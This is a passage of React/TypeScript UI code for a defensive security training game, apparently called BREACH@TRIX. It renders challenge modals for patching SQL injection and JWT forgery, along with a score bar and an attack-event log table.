                      background: C.greenDim,
                      border: `1px solid ${C.greenBorder}`,
                      color: C.green,
                    }
                  : {
                      background: C.redDim,
                      border: `1px solid rgba(248,113,113,0.25)`,
                      color: C.red,
                    }),
              }}
            >
              {challengeFeedback}
            </div>
          )}

          {ch.kind !== "single" &&
            (() => {
              const files = getFileStatuses();
              return (
                <div
                  style={{
                    display: "flex",
                    flexDirection: "column",
                    gap: 8,
                    marginTop: 14,
                  }}
                >
                  {files.map((f) => (
                    <div
                      key={f.key}
                      style={{
                        background: C.bg0,
                        borderRadius: 8,
                        border: `1px solid ${f.ok ? C.greenBorder : f.fb ? "rgba(248,113,113,0.2)" : C.border}`,
                        padding: "10px 13px",
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "space-between",
                      }}
                    >
                      <div
                        style={{
                          display: "flex",
                          alignItems: "center",
                          gap: 8,
                        }}
                      >
                        <div
                          style={{
                            width: 7,
                            height: 7,
                            borderRadius: "50%",
                            background: f.dot,
                          }}
                        />
                        <span
                          style={{
                            fontSize: 12,
                            color: C.text1,
                            fontFamily: mono,
                          }}
                        >
                          {f.label}
                        </span>
                      </div>
                      <span
                        style={{
                          fontSize: 10,
                          fontWeight: 700,
                          letterSpacing: ".05em",
                          padding: "2px 8px",
                          borderRadius: 4,
                          color: f.ok ? C.green : f.fb ? C.red : C.text3,
                          background: f.ok
                            ? C.greenDim
                            : f.fb
                              ? C.redDim
                              : C.bg3,
                        }}
                      >
                        {f.ok ? "fixed" : f.fb ? "needs fix" : "pending"}
                      </span>
                    </div>
                  ))}
                </div>
              );
            })()}
        </div>

        <div style={{ height: 1, background: C.border, margin: "18px 0 0" }} />

        <div style={{ flex: 1, overflowY: "auto", padding: "16px 20px" }}>
          {isPassed && (
            <div
              style={{
                padding: "14px 16px",
                borderRadius: 10,
                background: C.greenDim,
                border: `1px solid ${C.greenBorder}`,
                marginBottom: 20,
              }}
            >
              <div
                style={{
                  fontSize: 11,
                  fontWeight: 700,
                  color: C.green,
                  letterSpacing: ".06em",
                  marginBottom: 5,
                }}
              >
                ✓ VULNERABILITY CLOSED
              </div>
              <div style={{ fontSize: 12, color: "#86efac", lineHeight: 1.6 }}>
                {challengeType ? TYPE_LABELS[challengeType] : ""} attacks
                halted.
                {challengeType === "sqli_login" &&
                  " Login page is now protected."}
                {challengeType === "sqli_search" &&
                  " Search endpoint is now protected against UNION dumps."}
                {challengeType === "jwt_forge" &&
                  " Token forgery and IDOR on /api/user are blocked."}
              </div>
            </div>
          )}

          <div
            style={{
              fontSize: 10,
              fontWeight: 700,
              letterSpacing: ".12em",
              color: C.text3,
              marginBottom: 14,
            }}
          >
            ON PASS — EFFECTS
          </div>
          {[
            {
              icon: "🛡",
              text: (
                <>
                  {`All `}
                  <strong style={{ color: C.text1 }}>
                    {challengeType ? TYPE_LABELS[challengeType] : ""}
                  </strong>
                  {` logs marked fixed`}
                </>
              ),
            },
            { icon: "⛔", text: "New attacks of this type stop spawning" },
            ...(challengeType === "sqli_login"
              ? [
                  {
                    icon: "🔒",
                    text: "Login page activates its patch banner live",
                  },
                ]
              : []),
            ...(challengeType === "sqli_search"
              ? [
                  {
                    icon: "🔍",
                    text: "Search page blocks UNION dump payloads live",
                  },
                ]
              : []),
            ...(challengeType === "jwt_forge"
              ? [
                  {
                    icon: "🔒",
                    text: "Profile page blocks forge attempts live",
                  },
                ]
              : []),
            {
              icon: "⭐",
              text: (
                <>
                  <strong style={{ color: C.green }}>+{ch.points} pts</strong>
                  {` added to your score`}
                </>
              ),
            },
          ].map((item, i) => (
            <div
              key={i}
              style={{
                display: "flex",
                gap: 11,
                alignItems: "flex-start",
                marginBottom: 12,
              }}
            >
              <div
                style={{
                  width: 24,
                  height: 24,
                  borderRadius: 6,
                  background: C.bg3,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  flexShrink: 0,
                  fontSize: 12,
                }}
              >
                {item.icon}
              </div>
              <span
                style={{
                  fontSize: 12,
                  color: C.text2,
                  lineHeight: 1.55,
                  paddingTop: 3,
                }}
              >
                {item.text}
              </span>
            </div>
          ))}

          <div style={{ marginTop: 20 }}>
            <div
              style={{
                fontSize: 10,
                fontWeight: 700,
                letterSpacing: ".12em",
                color: C.text3,
                marginBottom: 12,
              }}
            >
              CHALLENGE BOARD
            </div>
            {Object.entries(CHALLENGES).map(([type, c]) => {
              const done = patchedTypes.has(type as AttackType);
              const tc = TYPE_COLORS[type as AttackType];
              const isCurrent = type === challengeType;
              return (
                <div
                  key={type}
                  style={{
                    display: "flex",
                    justifyContent: "space-between",
                    alignItems: "center",
                    padding: "10px 0",
                    borderBottom: `1px solid ${C.border}`,
                    opacity: done && !isCurrent ? 0.4 : 1,
                  }}
                >
                  <div
                    style={{ display: "flex", alignItems: "center", gap: 8 }}
                  >
                    {done && (
                      <span style={{ fontSize: 10, color: C.green }}>✓</span>
                    )}
                    <span
                      style={{
                        fontSize: 11,
                        fontWeight: 700,
                        color: done ? C.green : isCurrent ? tc.text : C.text2,
                      }}
                    >
                      {TYPE_LABELS[type as AttackType]}
                    </span>
                    {isCurrent && !done && (
                      <span
                        style={{
                          fontSize: 9,
                          fontWeight: 700,
                          padding: "1px 6px",
                          borderRadius: 3,
                          background: "rgba(74,222,128,0.1)",
                          color: C.green,
                          letterSpacing: ".06em",
                        }}
                      >
                        ACTIVE
                      </span>
                    )}
                  </div>
                  <span
                    style={{
                      fontSize: 12,
                      fontWeight: 800,
                      fontFamily: mono,
                      color: done ? C.green : C.text3,
                    }}
                  >
                    +{c!.points}
                  </span>
                </div>
              );
            })}
          </div>
        </div>
      </div>
    );
  }

  // ─── Generic two-file modal renderer ─────────────────────────────────────
  function renderTwoFileModal({
    ch,
    attackLabel,
    attackColor,
    attackBg,
    attackBorder,
    tab,
    setTab,
    file1Label,
    file2Label,
    file1Ok,
    file2Ok,
    file1Fb,
    file2Fb,
    code1,
    code2,
    setCode1,
    setCode2,
    showHintState,
    setShowHintState,
    activeHints,
    activeFb,
    activeOk,
    bothPass,
    submitFn,
    renderDiffFn,
    tabOptions,
  }: {
    ch: Challenge;
    attackLabel: string;
    attackColor: string;
    attackBg: string;
    attackBorder: string;
    tab: string;
    setTab: (t: any) => void;
    file1Label: string;
    file2Label: string;
    file1Ok: boolean;
    file2Ok: boolean;
    file1Fb: string;
    file2Fb: string;
    code1: string;
    code2: string;
    setCode1: (v: string) => void;
    setCode2: (v: string) => void;
    showHintState: boolean;
    setShowHintState: (v: boolean) => void;
    activeHints: string[];
    activeFb: string;
    activeOk: boolean;
    bothPass: boolean;
    submitFn: () => void;
    renderDiffFn: () => React.ReactNode;
    tabOptions: string[];
  }) {
    const tabLabels: Record<string, string> = {
      route: file1Label,
      page: file2Label,
      auth: file1Label,
      diff: "Diff View",
    };
    const tabStatusMap: Record<string, boolean | null> = {
      [tabOptions[0]]: file1Ok ? true : file1Fb ? false : null,
      [tabOptions[1]]: file2Ok ? true : file2Fb ? false : null,
      diff: null,
    };

    return (
      <div
        style={{
          width: "100%",
          maxWidth: 1100,
          background: C.bg1,
          border: `1px solid ${C.border}`,
          boxShadow: "0 25px 50px -12px rgba(0,0,0,0.5)",
          borderRadius: 12,
          display: "flex",
          flexDirection: "column",
          maxHeight: "90vh",
          overflow: "hidden",
        }}
      >
        {/* Header */}
        <div
          style={{
            padding: "24px 32px",
            borderBottom: `1px solid ${C.border}`,
            background: C.bg1,
            flexShrink: 0,
            display: "flex",
            justifyContent: "space-between",
            alignItems: "flex-start",
            gap: 20,
          }}
        >
          <div style={{ flex: 1, minWidth: 0 }}>
            <div
              style={{
                display: "flex",
                alignItems: "center",
                gap: 8,
                marginBottom: 16,
                flexWrap: "wrap",
              }}
            >
              <span
                style={{
                  fontSize: 11,
                  fontWeight: 600,
                  padding: "4px 10px",
                  borderRadius: 6,
                  color: C.text0,
                  background: C.bg3,
                  border: `1px solid ${C.border2}`,
                }}
              >
                Hotfix Required
              </span>
              <span
                style={{
                  fontSize: 11,
                  fontWeight: 600,
                  padding: "4px 10px",
                  borderRadius: 6,
                  color: attackColor,
                  background: attackBg,
                  border: `1px solid ${attackBorder}`,
                }}
              >
                {attackLabel}
              </span>
            </div>
            <div
              style={{
                fontSize: 22,
                fontWeight: 600,
                color: C.text0,
                letterSpacing: "-.02em",
                marginBottom: 8,
              }}
            >
              {ch.title}
            </div>
            <div
              style={{
                fontSize: 14,
                color: C.text1,
                lineHeight: 1.6,
                maxWidth: 650,
              }}
            >
              {ch.description}
            </div>
          </div>
          <div
            style={{
              display: "flex",
              alignItems: "center",
              gap: 16,
              flexShrink: 0,
            }}
          >
            <div style={{ textAlign: "right" }}>
              <div
                style={{
                  fontSize: 11,
                  fontWeight: 600,
                  color: C.text2,
                  marginBottom: 4,
                  textTransform: "uppercase",
                  letterSpacing: ".05em",
                }}
              >
                Reward
              </div>
              <div
                style={{
                  fontSize: 28,
                  fontWeight: 600,
                  color: C.green,
                  letterSpacing: "-.02em",
                  lineHeight: 1,
                }}
              >
                +{ch.points}
              </div>
            </div>
            <div
              style={{
                width: 1,
                height: 40,
                background: C.border,
                margin: "0 8px",
              }}
            />
            <button
              onClick={closeChallenge}
              style={{
                fontFamily: sans,
                background: "transparent",
                border: `1px solid ${C.border}`,
                borderRadius: 6,
                padding: "8px 14px",
                color: C.text1,
                cursor: "pointer",
                fontSize: 13,
                fontWeight: 500,
              }}
            >
              Cancel
            </button>
          </div>
        </div>

        {/* Body */}
        <div style={{ display: "flex", flex: 1, minHeight: 0, height: 600 }}>
          <div
            style={{
              flex: 1,
              minWidth: 0,
              display: "flex",
              flexDirection: "column",
              background: C.bg0,
            }}
          >
            {/* Tabs */}
            <div
              style={{
                display: "flex",
                background: C.bg1,
                borderBottom: `1px solid ${C.border}`,
                padding: "0 16px",
              }}
            >
              {[...tabOptions, "diff"].map((t) => {
                const st = tabStatusMap[t];
                const active = tab === t;
                return (
                  <button
                    key={t}
                    onClick={() => setTab(t)}
                    style={{
                      fontFamily: sans,
                      background: "transparent",
                      border: "none",
                      borderBottom: `2px solid ${active ? C.text0 : "transparent"}`,
                      padding: "16px 16px",
                      fontSize: 13,
                      fontWeight: active ? 600 : 500,
                      color: active ? C.text0 : C.text2,
                      cursor: "pointer",
                      display: "flex",
                      alignItems: "center",
                      gap: 8,
                      transition: "all .15s",
                      transform: "translateY(1px)",
                    }}
                  >
                    {tabLabels[t] || t}
                    {st === true && (
                      <span style={{ fontSize: 12, color: C.green }}>✓</span>
                    )}
                    {st === false && (
                      <span style={{ fontSize: 12, color: C.red }}>✕</span>
                    )}
                  </button>
                );
              })}
            </div>

            {tab !== "diff" && (
              <div
                style={{
                  padding: "12px 24px",
                  borderBottom: `1px solid ${C.border}`,
                  display: "flex",
                  alignItems: "center",
                  gap: 10,
                  background: C.bg0,
                }}
              >
                <button
                  onClick={() => setShowHintState(!showHintState)}
                  style={{
                    fontFamily: sans,
                    background: showHintState ? C.bg2 : "transparent",
                    border: `1px solid ${showHintState ? C.border2 : C.border}`,
                    borderRadius: 6,
                    padding: "6px 12px",
                    color: showHintState ? C.text0 : C.text2,
                    cursor: "pointer",
                    fontSize: 12,
                    fontWeight: 500,
                  }}
                >
                  {showHintState ? "Hide hint" : "Show hint"}
                </button>
              </div>
            )}

            {tab !== "diff" && showHintState && renderHints(activeHints)}

            {activeFb && tab !== "diff" && (
              <div
                style={{
                  padding: "12px 24px",
                  fontSize: 13,
                  fontWeight: 500,
                  borderBottom: `1px solid ${activeOk ? C.greenBorder : "rgba(239,68,68,0.2)"}`,
                  color: activeOk ? C.green : C.red,
                  background: activeOk ? C.greenDim : C.redDim,
                  display: "flex",
                  alignItems: "center",
                  gap: 10,
                }}
              >
                {activeFb}
              </div>
            )}

            {tab === tabOptions[0] && (
              <textarea
                value={code1}
                onChange={(e) => {
                  setCode1(e.target.value);
                  if (challengeResult !== "pass") {
                    setChallengeResult("idle");
                  }
                }}
                spellCheck={false}
                style={{
                  flex: 1,
                  background: "transparent",
                  color: C.text0,
                  fontFamily: mono,
                  fontSize: 13.5,
                  lineHeight: 1.6,
                  padding: "20px 24px",
                  border: "none",
                  resize: "none",
                  minHeight: 0,
                  tabSize: 2,
                }}
              />
            )}
            {tab === tabOptions[1] && (
              <textarea
                value={code2}
                onChange={(e) => {
                  setCode2(e.target.value);
                  if (challengeResult !== "pass") {
                    setChallengeResult("idle");
                  }
                }}
                spellCheck={false}
                style={{
                  flex: 1,
                  background: "transparent",
                  color: C.text0,
                  fontFamily: mono,
                  fontSize: 13.5,
                  lineHeight: 1.6,
                  padding: "20px 24px",
                  border: "none",
                  resize: "none",
                  minHeight: 0,
                  tabSize: 2,
                }}
              />
            )}
            {tab === "diff" && renderDiffFn()}
          </div>
          {renderRightPane(ch, submitFn, bothPass)}
        </div>
      </div>
    );
  }

  // ─── Single-snippet modal ─────────────────────────────────────────────────
  function renderSingleModal(ch: SingleSnippetChallenge) {
    const singlePass = challengeResult === "pass";
    return (
      <div
        style={{
          width: "100%",
          maxWidth: 1100,
          background: C.bg1,
          border: `1px solid ${C.border2}`,
          borderRadius: 20,
          display: "flex",
          flexDirection: "column",
          maxHeight: "96vh",
          overflow: "hidden",
          boxShadow: "0 40px 80px rgba(0,0,0,0.7)",
        }}
      >
        <div
          style={{
            padding: "22px 28px",
            borderBottom: `1px solid ${C.border}`,
            background: C.bg0,
            flexShrink: 0,
            display: "flex",
            justifyContent: "space-between",
            alignItems: "flex-start",
            gap: 20,
          }}
        >
          <div style={{ flex: 1, minWidth: 0 }}>
            <div
              style={{
                display: "flex",
                alignItems: "center",
                gap: 8,
                marginBottom: 12,
                flexWrap: "wrap",
              }}
            >
              <span
                style={{
                  fontSize: 10,
                  fontWeight: 700,
                  letterSpacing: ".12em",
                  padding: "3px 10px",
                  borderRadius: 5,
                  color: C.green,
                  background: C.greenDim,
                  border: `1px solid ${C.greenBorder}`,
                }}
              >
                HOTFIX CHALLENGE
              </span>
              {challengeType && (
                <span
                  style={{
                    fontSize: 10,
                    fontWeight: 700,
                    letterSpacing: ".12em",
                    padding: "3px 10px",
                    borderRadius: 5,
                    color: TYPE_COLORS[challengeType].text,
                    background: TYPE_COLORS[challengeType].bg,
                    border: `1px solid ${TYPE_COLORS[challengeType].border}`,
                  }}
                >
                  {TYPE_LABELS[challengeType]}
                </span>
              )}
            </div>
            <div
              style={{
                fontSize: 22,
                fontWeight: 800,
                color: C.text0,
                letterSpacing: "-.03em",
                marginBottom: 8,
              }}
            >
              {ch.title}
            </div>
            <div
              style={{
                fontSize: 13,
                color: C.text1,
                lineHeight: 1.7,
                maxWidth: 600,
              }}
            >
              {ch.description}
            </div>
          </div>
          <div
            style={{
              display: "flex",
              alignItems: "center",
              gap: 14,
              flexShrink: 0,
            }}
          >
            <div
              style={{
                background: C.greenDim,
                border: `1px solid ${C.greenBorder}`,
                borderRadius: 12,
                padding: "12px 22px",
                textAlign: "center",
              }}
            >
              <div
                style={{
                  fontSize: 9,
                  fontWeight: 700,
                  letterSpacing: ".12em",
                  color: C.green,
                  marginBottom: 4,
                }}
              >
                REWARD
              </div>
              <div
                style={{
                  fontSize: 30,
                  fontWeight: 800,
                  color: C.green,
                  letterSpacing: "-.04em",
                  lineHeight: 1,
                }}
              >
                +{ch.points}
              </div>
            </div>
            <button
              onClick={closeChallenge}
              style={{
                fontFamily: sans,
                background: "transparent",
                border: `1px solid ${C.border2}`,
                borderRadius: 8,
                padding: "9px 16px",
                color: C.text2,
                cursor: "pointer",
                fontSize: 12,
                fontWeight: 700,
              }}
            >
              ESC ✕
            </button>
          </div>
        </div>

        <div style={{ display: "flex", flex: 1, minHeight: 0, height: 560 }}>
          <div
            style={{
              flex: 1,
              minWidth: 0,
              display: "flex",
              flexDirection: "column",
              background: C.bg0,
            }}
          >
            <div
              style={{
                padding: "10px 20px",
                borderBottom: `1px solid ${C.border}`,
                display: "flex",
                alignItems: "center",
                gap: 10,
                flexShrink: 0,
              }}
            >
              <button
                onClick={() => setShowHint((h) => !h)}
                style={{
                  fontFamily: sans,
                  background: showHint ? C.amberDim : "transparent",
                  border: `1px solid ${showHint ? "rgba(251,191,36,0.3)" : C.border2}`,
                  borderRadius: 7,
                  padding: "6px 14px",
                  color: showHint ? C.amber : C.text2,
                  cursor: "pointer",
                  fontSize: 11,
                  fontWeight: 700,
                  letterSpacing: ".06em",
                  display: "flex",
                  alignItems: "center",
                  gap: 6,
                }}
              >
                💡 {showHint ? "Hide hint" : "Show hint"}
              </button>
              <span
                style={{
                  marginLeft: "auto",
                  fontSize: 10,
                  color: C.text3,
                  fontFamily: mono,
                }}
              >
                hotfix.ts
              </span>
            </div>
            {showHint && renderHints(ch.hints)}
            <div
              style={{
                padding: "10px 20px 0",
                flexShrink: 0,
                display: "flex",
                alignItems: "center",
                justifyContent: "space-between",
              }}
            >
              <div style={{ display: "flex", alignItems: "center", gap: 7 }}>
                <div
                  style={{
                    width: 7,
                    height: 7,
                    borderRadius: "50%",
                    background: C.green,
                  }}
                />
                <span
                  style={{
                    fontSize: 10,
                    fontWeight: 700,
                    color: C.green,
                    letterSpacing: ".1em",
                  }}
                >
                  YOUR FIX
                </span>
              </div>
            </div>
            <textarea
              value={challengeCode}
              onChange={(e) => {
                setChallengeCode(e.target.value);
                if (challengeResult !== "pass") {
                  setChallengeResult("idle");
                  setChallengeFeedback("");
                }
              }}
              spellCheck={false}
              style={{
                flex: 1,
                background: C.bg0,
                color: "#c9c5bc",
                fontFamily: mono,
                fontSize: 13,
                lineHeight: 1.8,
                padding: "12px 20px 24px",
                border: "none",
                outline: "none",
                resize: "none",
                minHeight: 0,
                tabSize: 2,
              }}
            />
          </div>
          {renderRightPane(ch, submitChallenge, singlePass)}
        </div>
      </div>
    );
  }

  // ─── Challenge modal dispatcher ───────────────────────────────────────────
  function renderChallengeModal() {
    if (!challenge || !challengeType) return null;

    if (challenge.kind === "two-file-sqli-login") {
      const ch = challenge as TwoFileSqliLoginChallenge;
      const activeHints =
        sqliLoginActiveTab === "route"
          ? ch.routeHints
          : sqliLoginActiveTab === "page"
            ? ch.pageHints
            : [];
      const activeFb =
        sqliLoginActiveTab === "route"
          ? sqliLoginRouteFeedback
          : sqliLoginActiveTab === "page"
            ? sqliLoginPageFeedback
            : "";
      const activeOk =
        sqliLoginActiveTab === "route" ? sqliLoginRouteOk : sqliLoginPageOk;
      return renderTwoFileModal({
        ch,
        attackLabel: "SQL Injection — Login",
        attackColor: "#b91c1c",
        attackBg: "#fff1f1",
        attackBorder: "#fca5a5",
        tab: sqliLoginActiveTab,
        setTab: setSqliLoginActiveTab,
        file1Label: "api/login/route.ts",
        file2Label: "login/page.tsx",
        file1Ok: sqliLoginRouteOk,
        file2Ok: sqliLoginPageOk,
        file1Fb: sqliLoginRouteFeedback,
        file2Fb: sqliLoginPageFeedback,
        code1: sqliLoginRouteCode,
        code2: sqliLoginPageCode,
        setCode1: setSqliLoginRouteCode,
        setCode2: setSqliLoginPageCode,
        showHintState: sqliLoginShowHint,
        setShowHintState: setSqliLoginShowHint,
        activeHints,
        activeFb,
        activeOk,
        bothPass: sqliLoginRouteOk && sqliLoginPageOk,
        submitFn: submitSqliLoginChallenge,
        renderDiffFn: () => renderSqliLoginDiff(ch),
        tabOptions: ["route", "page"],
      });
    }

    if (challenge.kind === "two-file-sqli-search") {
      const ch = challenge as TwoFileSqliSearchChallenge;
      const activeHints =
        sqliSearchActiveTab === "route"
          ? ch.routeHints
          : sqliSearchActiveTab === "page"
            ? ch.pageHints
            : [];
      const activeFb =
        sqliSearchActiveTab === "route"
          ? sqliSearchRouteFeedback
          : sqliSearchActiveTab === "page"
            ? sqliSearchPageFeedback
            : "";
      const activeOk =
        sqliSearchActiveTab === "route" ? sqliSearchRouteOk : sqliSearchPageOk;
      return renderTwoFileModal({
        ch,
        attackLabel: "SQL Injection — Search",
        attackColor: "#be185d",
        attackBg: "#fdf2f8",
        attackBorder: "#f9a8d4",
        tab: sqliSearchActiveTab,
        setTab: setSqliSearchActiveTab,
        file1Label: "api/search/route.ts",
        file2Label: "search/page.tsx",
        file1Ok: sqliSearchRouteOk,
        file2Ok: sqliSearchPageOk,
        file1Fb: sqliSearchRouteFeedback,
        file2Fb: sqliSearchPageFeedback,
        code1: sqliSearchRouteCode,
        code2: sqliSearchPageCode,
        setCode1: setSqliSearchRouteCode,
        setCode2: setSqliSearchPageCode,
        showHintState: sqliSearchShowHint,
        setShowHintState: setSqliSearchShowHint,
        activeHints,
        activeFb,
        activeOk,
        bothPass: sqliSearchRouteOk && sqliSearchPageOk,
        submitFn: submitSqliSearchChallenge,
        renderDiffFn: () => renderSqliSearchDiff(ch),
        tabOptions: ["route", "page"],
      });
    }

    if (challenge.kind === "two-file-jwt") {
      const ch = challenge as TwoFileJwtChallenge;
      const activeHints =
        jwtActiveTab === "auth"
          ? ch.authHints
          : jwtActiveTab === "route"
            ? ch.routeHints
            : [];
      const activeFb =
        jwtActiveTab === "auth"
          ? jwtAuthFeedback
          : jwtActiveTab === "route"
            ? jwtRouteFeedback
            : "";
      const activeOk = jwtActiveTab === "auth" ? jwtAuthOk : jwtRouteOk;
      return renderTwoFileModal({
        ch,
        attackLabel: "JWT Forgery",
        attackColor: "#7c3aed",
        attackBg: "#f5f3ff",
        attackBorder: "#c4b5fd",
        tab: jwtActiveTab,
        setTab: setJwtActiveTab,
        file1Label: "lib/auth.ts",
        file2Label: "api/user/route.ts",
        file1Ok: jwtAuthOk,
        file2Ok: jwtRouteOk,
        file1Fb: jwtAuthFeedback,
        file2Fb: jwtRouteFeedback,
        code1: jwtAuthCode,
        code2: jwtRouteCode,
        setCode1: setJwtAuthCode,
        setCode2: setJwtRouteCode,
        showHintState: jwtShowHint,
        setShowHintState: setJwtShowHint,
        activeHints,
        activeFb,
        activeOk,
        bothPass: jwtAuthOk && jwtRouteOk,
        submitFn: submitJwtChallenge,
        renderDiffFn: () => renderJwtDiff(ch),
        tabOptions: ["auth", "route"],
      });
    }

    return renderSingleModal(challenge as SingleSnippetChallenge);
  }

  // ─── JSX ─────────────────────────────────────────────────────────────────
  return (
    <div
      style={{
        minHeight: "100vh",
        background: "#0f0f11",
        fontFamily: sans,
        color: "#e8e6e1",
        display: "flex",
        flexDirection: "column",
        fontSize: 13,
      }}
    >
      {alertFlash && (
        <div
          style={{
            position: "fixed",
            inset: 0,
            border: "2px solid #ef4444",
            pointerEvents: "none",
            zIndex: 9999,
            animation: "redflash 0.5s ease-out forwards",
          }}
        />
      )}

      {/* CHALLENGE MODAL */}
      {challengeOpen && challenge && (
        <div
          style={{
            position: "fixed",
            inset: 0,
            background: "rgba(0,0,0,0.78)",
            backdropFilter: "blur(8px)",
            zIndex: 1000,
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            padding: 20,
          }}
        >
          {renderChallengeModal()}
        </div>
      )}

      {/* TOP BAR */}
      <header
        style={{
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
          padding: "0 28px",
          height: 58,
          background: "#111115",
          borderBottom: "1px solid #1e1e24",
          flexShrink: 0,
          gap: 16,
        }}
      >
        <div style={{ display: "flex", alignItems: "center", gap: 14 }}>
          <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
            <div
              style={{
                width: 20,
                height: 20,
                background: "linear-gradient(135deg,#4ade80,#22d3ee)",
                borderRadius: 5,
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
              }}
            >
              <svg width="11" height="11" viewBox="0 0 24 24" fill="none">
                <path
                  d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"
                  fill="white"
                />
              </svg>
            </div>
            <span
              style={{
                fontSize: 13,
                fontWeight: 800,
                color: "#f0ece4",
                letterSpacing: "-.02em",
              }}
            >
              BREACH<span style={{ color: "#4ade80" }}>@</span>TRIX
            </span>
            <span
              style={{
                fontSize: 11,
                color: "#3a3a42",
                fontWeight: 500,
                marginLeft: 4,
              }}
            >
              // blue team console
            </span>
          </div>
          {critCount > 0 && (
            <div
              style={{
                display: "flex",
                alignItems: "center",
                gap: 6,
                background: "rgba(239,68,68,.1)",
                border: "1px solid rgba(239,68,68,.25)",
                borderRadius: 6,
                padding: "3px 10px",
              }}
            >
              <div
                style={{
                  width: 6,
                  height: 6,
                  borderRadius: "50%",
                  background: "#ef4444",
                  animation: "pulse 1.2s infinite",
                }}
              />
              <span
                style={{
                  fontSize: 10,
                  color: "#ef4444",
                  fontWeight: 700,
                  letterSpacing: ".08em",
                }}
              >
                {critCount} CRITICAL ACTIVE
              </span>
            </div>
          )}
          {[...patchedTypes].map((t) => (
            <div
              key={t}
              style={{
                display: "flex",
                alignItems: "center",
                gap: 5,
                background: "rgba(74,222,128,.08)",
                border: "1px solid rgba(74,222,128,.2)",
                borderRadius: 6,
                padding: "3px 10px",
              }}
            >
              <span
                style={{
                  fontSize: 10,
                  color: "#4ade80",
                  fontWeight: 700,
                  letterSpacing: ".06em",
                }}
              >
                ✓ {TYPE_LABELS[t].split(" ")[0]}
              </span>
            </div>
          ))}
        </div>
        <div style={{ display: "flex", alignItems: "center", gap: 20 }}>
          <div style={{ textAlign: "right" }}>
            <div
              style={{
                fontSize: 9,
                color: "#3a3a42",
                fontWeight: 700,
                letterSpacing: ".1em",
                marginBottom: 1,
              }}
            >
              SCORE
            </div>
            <div
              style={{
                fontSize: 22,
                fontWeight: 800,
                color: "#4ade80",
                lineHeight: 1,
                letterSpacing: "-.03em",
                fontFamily: mono,
              }}
            >
              {score.toLocaleString()}
            </div>
          </div>
          <div style={{ width: 1, height: 32, background: "#1e1e24" }} />
          <div style={{ textAlign: "right" }}>
            <div
              style={{
                fontSize: 9,
                color: "#3a3a42",
                fontWeight: 700,
                letterSpacing: ".1em",
                marginBottom: 1,
              }}
            >
              UPTIME
            </div>
            <div
              style={{
                fontSize: 17,
                fontWeight: 700,
                color: isRunning ? "#e8e6e1" : "#3a3a42",
                lineHeight: 1,
                fontFamily: mono,
              }}
            >
              {fmtEl(elapsed)}
            </div>
          </div>
          <div style={{ width: 1, height: 32, background: "#1e1e24" }} />
          <div style={{ display: "flex", gap: 8 }}>
            <button
              onClick={() => setLogs([])}
              style={{
                fontFamily: sans,
                fontSize: 11,
                fontWeight: 700,
                letterSpacing: ".06em",
                padding: "6px 12px",
                borderRadius: 6,
                cursor: "pointer",
                background: "transparent",
                border: "1px solid #2a2a30",
                color: "#4a4a52",
              }}
            >
              CLEAR
            </button>
            <button
              onClick={() => setIsRunning((v) => !v)}
              style={{
                fontFamily: sans,
                fontSize: 11,
                fontWeight: 700,
                letterSpacing: ".06em",
                padding: "6px 12px",
                borderRadius: 6,
                cursor: "pointer",
                ...(isRunning
                  ? {
                      background: "rgba(251,191,36,.1)",
                      border: "1px solid rgba(251,191,36,.25)",
                      color: "#fbbf24",
                    }
                  : {
                      background: "rgba(74,222,128,.1)",
                      border: "1px solid rgba(74,222,128,.25)",
                      color: "#4ade80",
                    }),
              }}
            >
              {isRunning ? "⏸ PAUSE" : "▶ RESUME"}
            </button>
          </div>
        </div>
      </header>

      {/* MAIN LAYOUT */}
      <div
        style={{
          display: "flex",
          flex: 1,
          minHeight: 0,
          height: "calc(100vh - 58px)",
        }}
      >
        {/* LEFT: LOG LIST */}
        <div
          style={{
            flex: 1,
            display: "flex",
            flexDirection: "column",
            borderRight: "1px solid #1e1e24",
            minWidth: 0,
          }}
        >
          <div
            style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              padding: "0 24px",
              borderBottom: "1px solid #1e1e24",
              background: "#111115",
              flexShrink: 0,
            }}
          >
            <div style={{ display: "flex", gap: 0 }}>
              {(["all", "acknowledged", "fixed"] as FilterTab[]).map((tab) => {
                const labels: Record<FilterTab, string> = {
                  all: "All Events",
                  acknowledged: "Acknowledged",
                  fixed: "Fixed",
                };
                const active = filterTab === tab;
                return (
                  <button
                    key={tab}
                    onClick={() => setFilterTab(tab)}
                    style={{
                      fontFamily: sans,
                      background: "transparent",
                      border: "none",
                      borderBottom: `2px solid ${active ? "#4ade80" : "transparent"}`,
                      padding: "14px 18px",
                      fontSize: 11,
                      fontWeight: 700,
                      letterSpacing: ".08em",
                      color: active ? "#4ade80" : "#4a4a52",
                      cursor: "pointer",
                      transition: "all .15s",
                      display: "flex",
                      alignItems: "center",
                      gap: 7,
                    }}
                  >
                    {labels[tab]}
                    <span
                      style={{
                        fontSize: 10,
                        fontWeight: 700,
                        padding: "1px 6px",
                        borderRadius: 10,
                        background: active ? "rgba(74,222,128,.15)" : "#1e1e24",
                        color: active ? "#4ade80" : "#3a3a42",
                      }}
                    >
                      {tabCounts[tab]}
                    </span>
                  </button>
                );
              })}
            </div>
            <span
              style={{
                fontSize: 10,
                fontWeight: 700,
                letterSpacing: ".08em",
                color: isRunning ? "#4ade80" : "#4a4a52",
                display: "flex",
                alignItems: "center",
                gap: 5,
              }}
            >
              {isRunning && (
                <span
                  style={{
                    display: "inline-block",
                    width: 5,
                    height: 5,
                    borderRadius: "50%",
                    background: "#4ade80",
                    animation: "pulse 1.2s infinite",
                  }}
                />
              )}
              {isRunning ? "LIVE" : "PAUSED"}
            </span>
          </div>

          <div
            style={{
              display: "grid",
              gridTemplateColumns: "88px 82px 150px 1fr 110px",
              padding: "9px 24px",
              background: "#0d0d10",
              borderBottom: "1px solid #1e1e24",
              fontSize: 10,
              fontWeight: 700,
              letterSpacing: ".1em",
              color: "#3a3a42",
              flexShrink: 0,
            }}
          >
            <span>TIME</span>
            <span>SEV</span>
            <span>VECTOR</span>
            <span>ATTACKER / DETAIL</span>
            <span style={{ textAlign: "right" }}>STATUS</span>
          </div>

          <div style={{ flex: 1, overflowY: "auto" }}>
            {filteredLogs.length === 0 && (
              <div
                style={{
                  display: "flex",
